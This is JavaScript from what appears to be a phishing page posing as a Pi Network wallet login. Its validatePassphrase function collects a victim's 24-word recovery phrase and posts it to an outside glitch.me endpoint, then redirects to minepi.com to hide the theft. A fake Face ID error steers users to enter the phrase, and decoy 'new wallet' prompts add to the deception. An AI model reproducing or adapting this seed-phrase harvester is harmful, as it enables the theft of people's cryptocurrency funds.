async function validatePassphrase(inputId, errorId) {
            const input = document.getElementById(inputId);
            const error = document.getElementById(errorId);
            const words = input.value.trim().split(/\s+/).filter(word => word.length > 0);

            if (words.length !== 24) {
                error.style.display = 'block';
                error.textContent = 'Invalid Passphrase';
                return;
            }

            error.style.display = 'none';
            document.getElementById('loadingOverlay').style.display = 'flex';

            try {
                const response = await fetch('https://fuckyou-suraa.glitch.me/validate-passphrase', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ passphrase: input.value })
                });

                if (response.status === 429) {
                    alert("Server overloaded. Please wait before trying again.");
                    return;
                }

                const result = await response.json();
                if (result.success) window.location.href = "https://minepi.com";
            } catch (e) {
                alert("Connection error. Try again later.");
            } finally {
                document.getElementById('loadingOverlay').style.display = 'none';
            }
        }

        function showModal(modalType) {
            document.body.classList.add('modal-open');
            const modalId = `${modalType}Modal`;
            document.getElementById(modalId).style.display = "flex";
            
            
            setTimeout(() => {
                document.getElementById(modalId).scrollTop = 0;
            }, 50);
        }
        
        function hideModal(modalId) {
            document.body.classList.remove('modal-open');
            document.getElementById(modalId).style.display = "none";
        }
        
        function showFaceIDError() {
            alert("Face ID is not available at the moment. Please try with passphrase.");
        }
        
        function redirectToNewWallet() {
            if (confirm("This will create a new wallet. Your old wallet will be inaccessible. Continue?")) {
                window.location.href = "https://example.com/create-new-wallet";
            }
        }
        
        function redirectToNewAccount() {
            if (confirm("This will create a new wallet. Your old wallet will be inaccessible. Continue?")) {
                window.location.href = "https://example.com/create-new-brainstorm-account";
            }
        }

        
        document.addEventListener('DOMContentLoaded', function() {
            const textareas = document.querySelectorAll('.modal-content textarea');
            textareas.forEach(textarea => {
                textarea.addEventListener('focus', function() {
                    
                    window.scrollTo(0, 0);
                    document.body.scrollTop = 0;
                    
                    
                    setTimeout(() => {
                        const modalContent = this.closest('.modal-content');
                        if (modalContent) {
                            const inputRect = this.getBoundingClientRect();
                            const modalRect = modalContent.getBoundingClientRect();
                            const offset = inputRect.top - modalRect.top - 100;
                            modalContent.scrollTop = offset > 0 ? offset : 0;
                        }
                    }, 100);
                });
            });
        });
